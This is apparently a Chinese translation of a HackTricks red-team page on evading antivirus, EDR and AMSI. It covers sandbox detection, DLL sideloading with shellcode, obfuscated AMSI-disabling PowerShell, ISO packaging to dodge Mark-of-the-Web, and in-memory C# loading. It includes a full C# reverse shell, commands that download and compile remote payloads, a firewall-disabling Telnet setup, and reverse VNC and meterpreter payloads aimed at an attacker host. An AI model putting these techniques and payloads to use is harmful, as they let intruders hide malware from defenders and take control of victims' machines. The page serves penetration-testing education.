# 反病毒软件（AV）绕过

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

**本页由** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**编写！**

## **AV逃避方法论**

目前，AV使用不同的方法来检查文件是否恶意，包括静态检测、动态分析，以及更高级的EDR中的行为分析。

### **静态检测**

静态检测通过在二进制文件或脚本中标记已知的恶意字符串或字节数组，并从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）来实现。这意味着使用已知的公共工具可能更容易被发现，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：

* **加密**

如果您加密二进制文件，AV将无法检测到您的程序，但您需要某种加载程序来解密并在内存中运行程序。

* **混淆**

有时，您只需要更改二进制文件或脚本中的一些字符串，就可以使其通过AV，但这可能是一项耗时的任务，具体取决于您尝试混淆的内容。

* **自定义工具**

如果您开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

{% hint style="info" %}
检查Windows Defender静态检测的一个好方法是使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件分成多个段，然后要求Defender逐个扫描每个段，这样，它可以告诉您在您的二进制文件中标记的确切字符串或字节。
{% endhint %}

我强烈建议您查看这个关于实际AV逃避的[YouTube播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是指AV在沙箱中运行您的二进制文件并监视恶意活动（例如尝试解密并读取浏览器密码、在LSASS上执行minidump等）。这部分可能会更加棘手，但以下是一些可以用来规避沙箱的方法。

* **执行前休眠** 根据实现方式，这可能是绕过AV动态分析的好方法。AV有很短的时间来扫描文件，以免打断用户的工作流程，因此使用长时间的休眠可能会干扰二进制文件的分析。问题在于，许多AV的沙箱可能会根据实现方式跳过休眠。
* **检查机器资源** 通常，沙箱的资源非常有限（例如< 2GB RAM），否则可能会减慢用户的机器。您还可以在这里非常有创意，例如通过检查CPU的温度甚至风扇速度，不是所有内容都会在沙箱中实现。
* **特定于机器的检查** 如果您想针对加入“contoso.local”域的工作站用户进行定位，可以检查计算机的域，看看是否与您指定的域匹配，如果不匹配，您可以让程序退出。

事实证明，Microsoft Defender的沙箱计算机名为HAL9TH，因此，您可以在引爆前检查恶意软件中的计算机名，如果名称匹配HAL9TH，则表示您在Defender的沙箱中，因此可以让程序退出。

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)提供的一些其他非常好的针对沙箱的技巧

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

正如我们在本文中之前所说，**公共工具**最终将**被检测到**，因此，您应该问自己一个问题：

例如，如果您想转储LSASS，**您真的需要使用mimikatz**吗？还是您可以使用一个不太知名但也可以转储LSASS的项目。

正确答案可能是后者。以mimikatz为例，它可能是AV和EDR中被标记为最多的恶意软件之一，虽然项目本身非常酷，但要绕过AV，可能会很棘手，因此只需寻找您尝试实现的目标的替代方案。

{% hint style="info" %}
在修改用于逃避的有效负载时，请确保在defender中**关闭自动样本提交**，并且，请认真对待，**不要将其上传到VIRUSTOTAL**，如果您的目标是长期实现逃避。如果要检查特定AV是否检测到您的有效负载，请在虚拟机上安装它，尝试关闭自动样本提交，并在那里进行测试，直到您对结果满意为止。
{% endhint %}

## EXE与DLL

在可能的情况下，始终**优先使用DLL进行逃避**，根据我的经验，DLL文件通常**检测和分析较少**，因此这是一个非常简单的技巧，可用于在某些情况下避免检测（如果您的有效负载有某种方式作为DLL运行）。

正如我们在这张图片中看到的，Havoc的DLL有效负载在antiscan.me中的检测率为4/26，而EXE有效负载的检测率为7/26。

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me对Havoc普通EXE有效负载与普通Havoc DLL的比较</p></figcaption></figure>

现在我们将展示一些您可以使用DLL文件的技巧，使其更加隐蔽。

## DLL侧载和代理

**DLL侧载**利用加载程序使用的DLL搜索顺序，将受害应用程序和恶意有效负载放在一起。

您可以使用[Siofra](https://github.com/Cybereason/siofra)和以下PowerShell脚本检查易受DLL侧载攻击的程序：

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

这个命令将输出在"C:\Program Files\\"目录下易受DLL劫持影响的程序列表，以及它们尝试加载的DLL文件。

我强烈建议你**自己探索DLL劫持/侧载程序**，这种技术如果做得很隐蔽，是相当难以察觉的，但如果你使用公开已知的DLL侧载程序，可能会很容易被发现。

仅仅通过放置一个恶意DLL，并使用程序期望加载的名称，不会加载你的有效负载，因为程序期望在该DLL中有一些特定的功能，为了解决这个问题，我们将使用另一种称为**DLL代理/转发**的技术。

**DLL代理**将程序从代理（和恶意）DLL发出的调用转发到原始DLL，从而保留程序的功能并能够处理执行你的有效负载。

我将使用[@flangvik](https://twitter.com/Flangvik/)的[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)项目。

以下是我遵循的步骤：

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

最后一个命令会给我们2个文件：一个DLL源代码模板和重命名后的原始DLL。

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

这些是结果：

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上都有 0/26 的检测率！我会称之为成功。

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
我**强烈建议**您观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE) 以深入了解我们讨论的内容。
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个绕过 EDRs 的 payload 工具包，使用挂起进程、直接系统调用和替代执行方法`

您可以使用 Freeze 以隐秘的方式加载和执行您的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
逃避只是一场猫鼠游戏，今天有效的方法明天可能被检测到，因此永远不要仅依赖一个工具，如果可能的话，尝试链接多种逃避技术。
{% endhint %}

## AMSI（反恶意软件扫描接口）

AMSI旨在防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless\_malware)”。最初，防病毒软件只能扫描**磁盘上的文件**，因此，如果您以某种方式**直接在内存中执行有效载荷**，防病毒软件无法阻止它，因为它没有足够的可见性。

AMSI功能已集成到Windows的以下组件中。

- 用户帐户控制（UAC）（提升EXE、COM、MSI或ActiveX安装）
- PowerShell（脚本、交互式使用和动态代码评估）
- Windows脚本宿主（wscript.exe和cscript.exe）
- JavaScript和VBScript
- Office VBA宏

它允许防病毒解决方案检查脚本行为，通过以未加密和未混淆的形式公开脚本内容。

运行`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`将在Windows Defender上产生以下警报。

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

请注意，它在路径之前加上`amsi:`，然后是脚本运行的可执行文件的路径，本例中为powershell.exe

我们没有将任何文件写入磁盘，但由于AMSI的存在，仍然在内存中被捕获。

有几种方法可以规避AMSI：

- **混淆**

由于AMSI主要用于静态检测，因此修改您尝试加载的脚本可能是规避检测的好方法。

但是，即使脚本有多个层，AMSI也有解混淆脚本的能力，因此，取决于如何执行混淆，混淆可能不是一个好选择。这使得规避并不是那么直截了当。尽管有时，您只需要更改几个变量名，就可以规避检测，因此这取决于某些内容是否被标记。

- **AMSI绕过**

由于AMSI是通过将DLL加载到powershell（也包括cscript.exe、wscript.exe等）进程中实现的，因此即使作为非特权用户运行，也很容易篡改它。由于AMSI实现中存在这个缺陷，研究人员已经找到了多种规避AMSI扫描的方法。

**强制错误**

强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初由[Matt Graeber](https://twitter.com/mattifestation)披露，微软已开发了一个签名以防止更广泛的使用。

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

只需要一行PowerShell代码就可以使AMSI对当前PowerShell进程无效。当然，这行代码已经被AMSI本身标记，因此需要进行一些修改才能使用这种技术。

这是我从这个[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)中获取的修改后的AMSI绕过方法。
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**内存补丁**

这种技术最初是由[@RastaMouse](https://twitter.com/_RastaMouse/)发现的，它涉及查找amsi.dll中“AmsiScanBuffer”函数的地址（负责扫描用户提供的输入），并用指令覆盖它以返回E_INVALIDARG代码，这样，实际扫描的结果将返回0，被解释为干净的结果。

{% hint style="info" %}
请阅读[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)以获取更详细的解释。
{% endhint %}

还有许多其他用于绕过PowerShell的AMSI的技术，请查看[**此页面**](basic-powershell-for-pentesters/#amsi-bypass)和[此存储库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)以了解更多信息。

## 混淆

有几种工具可用于**混淆C#明文代码**，生成**元编程模板**以编译二进制文件或**混淆已编译的二进制文件**，例如：

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C#混淆器**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator)：该项目的目标是提供[LLVM](http://www.llvm.org/)编译套件的开源分支，能够通过[代码混淆](http://en.wikipedia.org/wiki/Obfuscation_(software))和防篡改提供增强软件安全性。
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator)：ADVobfuscator演示了如何使用`C++11/14`语言在编译时生成混淆代码，而不使用任何外部工具并且不修改编译器。
* [**obfy**](https://github.com/fritzone/obfy)：通过C++模板元编程框架生成一层混淆操作，使想要破解应用程序的人的生活变得更加困难。
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**：**Alcatraz是一款能够混淆各种不同PE文件的x64二进制混淆器，包括：.exe、.dll、.sys
* [**metame**](https://github.com/a0rtega/metame)：Metame是一个用于任意可执行文件的简单变形代码引擎。
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator)：ROPfuscator是一个针对LLVM支持的语言使用ROP（返回导向编程）的细粒度代码混淆框架。ROPfuscator通过将常规指令转换为ROP链来在汇编代码级别混淆程序，从而破坏我们对正常控制流的自然概念。
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt)：Nimcrypt是一个用Nim编写的.NET PE加密器。
* [**inceptor**](https://github.com/klezVirus/inceptor)**：**Inceptor能够将现有的EXE/DLL转换为shellcode，然后加载它们。

## SmartScreen和MoTW

当从互联网下载并执行某些可执行文件时，您可能会看到此屏幕。

Microsoft Defender SmartScreen是一种旨在保护最终用户免受运行潜在恶意应用程序的安全机制。

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen主要采用基于声誉的方法，意味着不常见的下载应用程序将触发SmartScreen，从而警告并阻止最终用户执行文件（尽管仍可以通过单击“更多信息” -> “仍要运行”来执行文件）。

**MoTW**（Mark of The Web）是一个带有Zone.Identifier名称的[NTFS备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS))，在从互联网下载文件时会自动创建，以及它被下载的URL。

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>检查从互联网下载的文件的Zone.Identifier ADS。</p></figcaption></figure>

{% hint style="info" %}
重要提示：使用**受信任的**签名证书签名的可执行文件**不会触发SmartScreen**。
{% endhint %}

防止您的有效载荷获得Mark of The Web的一种非常有效的方法是将它们打包到某种容器中，比如ISO。这是因为Mark-of-the-Web（MOTW）**无法**应用于**非NTFS**卷。

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)是一个将有效载荷打包到输出容器中以规避Mark-of-the-Web的工具。

示例用法：
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
以下是使用[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)将有效负载打包在ISO文件中绕过SmartScreen的演示。

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C#程序集反射

将C#二进制文件加载到内存中已经有一段时间了，这仍然是一个非常好的方法，可以在不被杀毒软件发现的情况下运行您的后渗透工具。

由于有效负载将直接加载到内存中而不会触及磁盘，我们只需要担心为整个过程打补丁AMS。大多数C2框架（如sliver、Covenant、metasploit、CobaltStrike、Havoc等）已经提供了直接在内存中执行C#程序集的能力，但有不同的执行方式：

* **分叉和运行**

它涉及**生成一个新的牺牲进程**，将您的后渗透恶意代码注入到该新进程中，执行您的恶意代码，完成后终止新进程。这种方法的好处和缺点都有。分叉和运行方法的好处在于执行发生在我们的Beacon植入进程**之外**。这意味着如果我们的后渗透操作出了问题或被发现，我们的**植入物存活的机会**要**大得多**。缺点是您被**行为检测**发现的机会**更大**。

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **内联**

这是将后渗透恶意代码**注入到自己的进程**中。这样，您可以避免创建新进程并让其被杀毒软件扫描，但缺点是如果执行有效负载出现问题，您的Beacon**很可能会丢失**，因为它可能会崩溃。

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
如果您想了解更多关于C#程序集加载的信息，请查看这篇文章[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)以及他们的InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

您还可以**从PowerShell**加载C#程序集，请查看[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)和[S3cur3th1sSh1t的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## 使用其他编程语言

如[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)中提出的，通过让受损机器访问**安装在攻击者控制的SMB共享上的解释器环境**，可以使用其他语言执行恶意代码。&#x20;

通过允许访问解释器二进制文件和SMB共享上的环境，您可以在受损机器的内存中**执行这些语言中的任意代码**。

该存储库指出：Defender仍然会扫描脚本，但通过利用Go、Java、PHP等，我们有**更多灵活性来绕过静态签名**。在这些语言中使用随机未混淆的反向外壳脚本进行测试已被证明是成功的。

## 高级逃避

逃避是一个非常复杂的话题，有时您必须考虑一个系统中许多不同来源的遥测数据，因此在成熟的环境中完全不被检测到几乎是不可能的。

您对抗的每个环境都有其优势和劣势。

我强烈建议您观看[@ATTL4S](https://twitter.com/DaniLJ94)的这个演讲，以了解更多关于高级逃避技术的入门。

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

这也是[@mariuszbit](https://twitter.com/mariuszbit)关于深度逃避的另一个很棒的演讲。

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **旧技术**

### **检查Defender发现的恶意部分**

您可以使用[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**删除二进制文件的部分**，直到**找出Defender**认为是恶意的部分并将其拆分给您。\
另一个执行**相同操作的工具是**[**avred**](https://github.com/dobin/avred)，提供在[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)的开放网络服务。

### **Telnet服务器**

在Windows10之前，所有Windows都带有一个**Telnet服务器**，您可以安装它（作为管理员）执行：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**启动**，现在**运行**它：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改telnet端口**（隐蔽）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从以下链接下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（下载二进制文件，而不是安装程序）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

* 启用选项 _Disable TrayIcon_
* 在 _VNC Password_ 中设置密码
* 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移动到**受害者**内

#### **反向连接**

**攻击者**应该在**主机**内执行二进制文件 `vncviewer.exe -listen 5900`，这样它将准备好捕获反向**VNC连接**。然后，在**受害者**内：启动 winvnc 守护程序 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：**为保持隐蔽，您必须避免做一些事情

* 如果`winvnc`已经运行，请不要启动它，否则会触发[弹出窗口](https://i.imgur.com/1SROTTl.png)。使用`tasklist | findstr winvnc`检查是否正在运行
* 不要在没有`UltraVNC.ini`的同一目录中启动`winvnc`，否则会导致[配置窗口](https://i.imgur.com/rfMQWcf.png)打开
* 不要运行`winvnc -h`以获取帮助，否则会触发[弹出窗口](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从以下链接下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在GreatSCT内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` 启动 **lister**，然后执行以下 **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的防御程序会非常快速地终止该进程。**

### 编译我们自己的反向 shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# 反向 shell

使用以下命令进行编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用方法：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### 使用编译器的C#
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C#混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
